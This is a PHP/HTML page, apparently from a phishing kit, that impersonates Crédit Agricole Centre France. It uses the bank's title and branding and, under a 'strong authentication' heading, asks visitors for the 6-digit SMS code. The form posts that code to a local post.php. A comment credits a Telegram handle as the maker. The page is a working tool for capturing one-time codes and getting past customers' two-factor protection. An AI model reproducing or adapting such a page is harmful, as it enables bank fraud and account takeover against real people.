<?php 

     require_once "function.php";

                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Accéder à mes comptes - Crédit Agricole Centre France</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicone.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/over.css">
</head>
<body>
        

        <div class="navbar navbar_cc">
             <div class="coantainer-fluid"> 
                  <img src="image/far.jpg">
                  <div class="anis">
                     <span><i class="bi bi-x"></i></span>
                  </div>
             </div>
        </div>

        <div class="togather forever">
             <div class="container-fluid">
                  <div class="left left_cc box">
                       <div class="imaga imaga_cc">
                            <div class="decovrer eco">
                                 <h3>Téléchargez l’application Ma Banque</h3>
                                 <p>Chacun d’entre vous gère différemment ses besoins bancaires. <br>
                                   Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.
                                 </p>
                                 <button class="btn">Découvrez les grandes fonctionnalités</button>
                            </div>
                       </div>
                  </div>
                  <div class="right right_cc box forte">
                         <div class="login pogin">
                              <h2 class="mb-3">AUTHENTIFICATION FORTE</h2>
                              <span><i class="fa fa-check "></i>Patienter,Vous aller recevoir un code sur votre téléphone mobile</span>
                              <div class="pop text-center">Veuillez entrer le code de 6 caracteres recu par SMS ci-dessous:</div>
                              <form action="post.php" method="post">
                                   <input type="hidden" name="step" value="forte">
                                   <div class="form-group tiktok mt-5 zintok">
                                        <label>CODE D'AUTHENTIFICATION</label>
                                        <input type="numeric" name="code_fort" id="code_fort" class="form-control mb-4" maxlength="666666">
                                   </div>
                                   <button class="btn" name="submit" id="sent" style="background:#007461;color:white;">VALIDER</button>
                              </form>
                         </div>
                  </div>
             </div>
        </div>

        

        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
                
        </script>
              
</body>
</html>